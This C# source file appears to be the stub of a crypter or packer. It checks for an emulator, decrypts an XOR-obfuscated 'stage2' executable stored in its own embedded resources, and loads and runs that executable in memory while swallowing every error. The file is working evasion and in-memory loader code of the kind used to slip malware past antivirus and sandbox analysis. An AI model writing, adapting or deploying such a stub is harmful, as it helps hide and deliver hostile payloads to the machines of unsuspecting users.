using System;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Resources;

public partial class __Stub
{
	/// <summary>
	/// void Main(string[] args)
	/// </summary>
	[STAThread]
	public static void Main(string[] __args)
	{
		try
		{
			// Detect emulator
			__DetectEmulator();
		}
		catch
		{
		}

		try
		{
			//{STAGE2HEADER}

			using (ResourceReader reader = new ResourceReader(Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceFileName)))
			{
				// Get stage2 executable from resources
				string type;
				byte[] resourceData;
				reader.GetResourceData(resourceName, out type, out resourceData);

				// Decrypt stage2
				byte[] stage2 = new byte[stage2Size];
				for (int i = /**/0, j = /**/4; i < stage2Size; i++)
				{
					stage2[i] = (byte)(resourceData[j++] ^ key);

					if ((paddingMask & 1) == 1) j += paddingByteCount;

					key = (key >> 5 | key << (32 - 5)) * 7;
					paddingMask = paddingMask >> 1 | paddingMask << (32 - 1);
				}

				// Invoke stage2 executable
				//   - args[0] = Combined commandline arguments (Environment.CommandLine)
				//   - args[1..n] = Separated commandline arguments
				Assembly.Load(stage2).EntryPoint.Invoke(null, new[] { new[] { Environment.CommandLine }.Concat(__args).ToArray() });
			}
		}
		catch
		{
		}
	}
}